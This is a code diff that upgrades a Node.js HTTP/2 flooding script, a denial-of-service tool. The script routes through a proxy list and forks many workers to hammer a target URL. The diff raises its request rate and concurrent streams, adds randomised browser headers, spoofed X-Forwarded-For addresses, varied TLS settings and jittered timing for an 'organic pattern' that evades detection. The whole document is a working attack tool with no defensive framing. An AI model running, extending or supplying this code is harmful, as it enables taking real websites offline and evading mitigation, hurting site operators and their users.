@@ -11,13 +11,20 @@ require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', () => {});
 
 if (process.argv.length < 7) {
+    console.log("Usage: node http2_flooder.js <target_url> <time_seconds> <rate_per_thread> <threads> <proxy_file>");
     process.exit(1);
 }
 
 function readLines(filePath) {
-    if (!fs.existsSync(filePath)) process.exit(1);
+    if (!fs.existsSync(filePath)) {
+        console.error("Proxy file not found!");
+        process.exit(1);
+    }
     const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
-    if (!lines.length) process.exit(1);
+    if (!lines.length) {
+        console.error("Proxy file is empty!");
+        process.exit(1);
+    }
     return lines;
 }
 
@@ -47,7 +54,10 @@ const args = {
 };
 
 const parsedTarget = url.parse(args.target);
-if (!parsedTarget.protocol || !parsedTarget.host) process.exit(1);
+if (!parsedTarget.protocol || !parsedTarget.host) {
+    console.error("Invalid target URL!");
+    process.exit(1);
+}
 
 const userAgents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
@@ -55,53 +65,75 @@ const userAgents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Android 14; Mobile; rv:129.0) Gecko/129.0 Firefox/129.0"
+    "Mozilla/5.0 (Android 14; Mobile; rv:129.0) Gecko/129.0 Firefox/129.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/127.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36"
 ];
 
 const accept_header = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-    "application/json, text/plain, */*"
+    "application/json, text/plain, */*",
+    "text/html,application/xhtml+xml,*/*;q=0.9",
+    "image/webp,image/apng,image/*,*/*;q=0.8"
 ];
 const lang_header = [
     "en-US,en;q=0.9",
     "vi-VN,vi;q=0.9,en-US;q=0.8",
-    "zh-CN,zh;q=0.9,en;q=0.8"
+    "zh-CN,zh;q=0.9,en;q=0.8",
+    "fr-FR,fr;q=0.9,en;q=0.8",
+    "es-ES,es;q=0.9,en;q=0.8"
 ];
-const encoding_header = ["gzip, deflate, br"];
+const encoding_header = [
+    "gzip, deflate, br",
+    "gzip, deflate",
+    "br",
+    "gzip"
+];
 const sec_fetch_headers = {
-    "sec-fetch-dest": ["document", "empty", "script"],
-    "sec-fetch-mode": ["navigate", "cors", "no-cors"],
-    "sec-fetch-site": ["same-origin", "cross-site"]
+    "sec-fetch-dest": ["document", "empty", "script", "image"],
+    "sec-fetch-mode": ["navigate", "cors", "no-cors", "same-origin"],
+    "sec-fetch-site": ["same-origin", "cross-site", "none"]
 };
-const cache_control = ["no-cache", "no-store"];
+const cache_control = ["no-cache", "no-store", "max-age=0"];
 const referers = [
     `https://${parsedTarget.host}/`,
     "https://www.google.com/",
+    "https://www.bing.com/",
+    "https://www.facebook.com/",
     ""
 ];
-const platforms = ["Windows", "Macintosh", "iPhone", "Android"];
+const platforms = ["Windows", "Macintosh", "iPhone", "Android", "Linux"];
 const sec_ch_ua = [
     '"Google Chrome";v="127", "Chromium";v="127", "Not.A/Brand";v="99"',
     '"Firefox";v="129"',
-    '"Safari";v="18"'
+    '"Safari";v="18"',
+    '"Microsoft Edge";v="127"',
+    '"Not/A)Brand";v="99", "Chromium";v="127"'
 ];
 
 const ciphers = [
     "TLS_AES_128_GCM_SHA256",
     "TLS_AES_256_GCM_SHA384",
     "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
-    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
+    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
+    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA",
+    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA"
 ].join(":");
 
 const proxies = readLines(args.proxyFile);
+let requestCounter = 0;
 
 if (cluster.isMaster) {
+    console.log(`Starting flooder on ${args.target} with ${args.threads} threads for ${args.time} seconds...`);
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
     }
-    setTimeout(() => process.exit(0), args.time * 1000);
+    setTimeout(() => {
+        console.log(`Attack finished. Total requests sent: ${requestCounter}`);
+        process.exit(0);
+    }, args.time * 1000);
 } else {
-    setInterval(runFlooder, 100);
+    setInterval(runFlooder, 50); // Reduced interval for faster requests
 }
 
 class NetSocket {
@@ -137,9 +169,9 @@ class NetSocket {
             callback(undefined, "timeout");
         });
 
-        connection.on("error", () => {
+        connection.on("error", (err) => {
             connection.destroy();
-            callback(undefined, "error");
+            callback(undefined, `proxy error: ${err.message}`);
         });
     }
 }
@@ -152,9 +184,11 @@ function generateDynamicPath() {
         `q=${randstr(6)}`,
         `id=${randstr(4)}`,
         `p=${randomIntn(1, 50)}`,
-        `t=${randstr(8)}`
+        `t=${randstr(8)}`,
+        `s=${randstr(5)}`,
+        `r=${randomIntn(1000, 9999)}`
     ];
-    return `${basePath}?${randomElement(queries)}`;
+    return `${basePath}?${randomElement(queries)}&${randomElement(queries)}`;
 }
 
 function generateDynamicHeaders() {
@@ -175,37 +209,44 @@ function generateDynamicHeaders() {
         "sec-ch-ua-platform": randomElement(platforms),
         "cache-control": randomElement(cache_control),
         "referer": randomElement(referers),
-        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`
+        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`,
+        "x-requested-with": randomElement(["XMLHttpRequest", ""]),
+        "pragma": randomElement(["no-cache", ""])
     };
 }
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
-    if (!parsedProxy[0] || !parsedProxy[1]) return setTimeout(runFlooder, 1000);
+    if (!parsedProxy[0] || !parsedProxy[1]) {
+        return setTimeout(runFlooder, 500);
+    }
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
         address: parsedTarget.host + ":443",
-        timeout: 5
+        timeout: 3 // Reduced timeout for faster retry
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) {
+            console.error(`Proxy error: ${error}`);
             if (connection) connection.destroy();
-            return setTimeout(runFlooder, 1000);
+            return setTimeout(runFlooder, 500);
         }
 
         const tlsOptions = {
             secure: true,
-            ALPNProtocols: ['h2'],
+            ALPNProtocols: ['h2', 'http/1.1'],
             ciphers: ciphers,
             host: parsedTarget.host,
             servername: parsedTarget.host,
             rejectUnauthorized: false,
             minVersion: 'TLSv1.2',
-            maxVersion: 'TLSv1.3'
+            maxVersion: 'TLSv1.3',
+            sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256",
+            ecdhCurve: "prime256v1:secp384r1"
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
@@ -215,7 +256,7 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 100,
+                maxConcurrentStreams: 200, // Increased for more streams
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536
             },
@@ -227,32 +268,41 @@ function runFlooder() {
                 const dynHeaders = generateDynamicHeaders();
                 for (let i = 0; i < args.Rate; i++) {
                     const request = client.request(dynHeaders);
-                    request.on("response", () => {
+                    requestCounter++; // Increment counter for each request sent
+                    request.on("response", (headers) => {
+                        console.log(`Response: ${headers[":status"]}`);
                         request.close();
                         request.destroy();
                     });
-                    request.on("error", () => {
+                    request.on("error", (err) => {
+                        console.error(`Request error: ${err.message}`);
                         request.close();
                         request.destroy();
                     });
                     request.end();
                 }
-            }, 80);
-            setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
+            }, 50 + randomIntn(0, 20)); // Jittered interval for organic pattern
+            setTimeout(() => {
+                clearInterval(IntervalAttack);
+                client.destroy();
+                tlsConn.destroy();
+                connection.destroy();
+            }, args.time * 1000);
         });
 
-        client.on("error", () => {
+        client.on("error", (err) => {
+            console.error(`Client error: ${err.message}`);
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, 1000);
+            setTimeout(runFlooder, 500);
         });
 
         client.on("close", () => {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, 1000);
+            setTimeout(runFlooder, 500);
         });
     });
 }
